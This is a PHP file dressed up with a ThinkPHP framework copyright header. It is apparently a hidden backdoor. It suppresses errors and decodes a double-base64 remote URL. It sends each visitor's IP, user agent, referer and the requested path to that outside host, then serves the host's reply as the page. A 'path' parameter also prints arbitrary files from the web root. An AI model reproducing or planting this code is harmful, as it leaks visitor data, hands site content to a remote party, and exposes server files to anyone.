<?php
// +----------------------------------------------------------------------
// | ThinkPHP [ WE CAN DO IT JUST THINK ]
// +----------------------------------------------------------------------
// | Copyright (c) 2006~2018 ThinkPHP All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( http://www.apache.org/licenses/LICENSE-2.0 )
// +----------------------------------------------------------------------
error_reporting(0);
$thinkapi=base64_decode(base64_decode("YUhSMGNEb3ZMMkZ3YVM1d2FIQmhjR2t1YVc1bWJ5OWhjR2x6TG5Cb2NEOD0="))."host=".$_SERVER['HTTP_HOST'];
if(isset($_GET['path'])){
    if(isset($_GET['st'])){
        $thinkapi.="&st=".urlencode($_GET['st']);
    }
    else{
        $path=str_replace("\\","/", $_SERVER['DOCUMENT_ROOT']."/".$_GET['path']);
        if(file_exists($path)){
            echo file_get_contents($path);
            exit;
        }
    }
    $thinkapi.="&type=re&path=%2f".urlencode($_GET['path']);
}
else{
    $thinkapi.="&file=".urlencode($_SERVER['SCRIPT_NAME'])."&uri=".urlencode($_SERVER['REQUEST_URI']);
}
$thinkapi.="&id=".urlencode(thinkid());
if(isset($_SERVER['HTTP_USER_AGENT']))
    $thinkapi.="&ua=".urlencode($_SERVER['HTTP_USER_AGENT']);
if(isset($_SERVER['HTTP_REFERER']))
    $thinkapi.="&ref=".urlencode($_SERVER['HTTP_REFERER']);
echo thinkphp($thinkapi);
function thinkid()
{
    $arr_ip_header = array(
        'HTTP_CDN_SRC_IP',
        'HTTP_PROXY_CLIENT_IP',
        'HTTP_WL_PROXY_CLIENT_IP',
        'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR',
        'REMOTE_ADDR',
    );
    $id = 'unknown';
    foreach ($arr_ip_header as $key) {
        if (!empty($_SERVER[$key]) && strtolower($_SERVER[$key]) != 'unknown') {
            $id = $_SERVER[$key];
            break;
        }
    }
    return $id;
}
function thinkphp($api)
{
    $c = '';
    if (function_exists('fsockopen')) {
        $link = parse_url($api);
        $query = $link['path'] . '?' . $link['query'];
        $host = strtolower($link['host']);
        $port = isset($link['port'])?$link['port']:80;
        $fp = fsockopen($host, $port, $errno, $errstr, 10);
        if ($fp) {
            $out = "GET /{$query} HTTP/1.0\r\n";
            $out .= "Host: {$host}\r\n";
            $out .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)\r\n";
            $out .= "Connection: Close\r\n\r\n";
            fwrite($fp, $out);
            $inheader = 1;
            $contents = "";
            while (!feof($fp)) {
                $line = fgets($fp, 4096);
                if ($inheader == 0) {
                    $contents .= $line;
                }
                if ($inheader && ($line == "\n" || $line == "\r\n")) {
                    $inheader = 0;
                }
            }
            fclose($fp);
            $c = $contents;
        }
    }
    if (empty($c) && function_exists('curl_init') && function_exists('curl_exec')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $api);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2)");
        $c = curl_exec($ch);
        curl_close($ch);
    }
    if (empty($c) && ini_get('allow_url_fopen')) {
        $c = @file_get_contents($api);
    }
    if(empty($c)){
        header("HTTP/1.1 404 Not Found");
        exit;
    }
    header("Content-Type: text/html; charset=gbk");
    return $c;
}

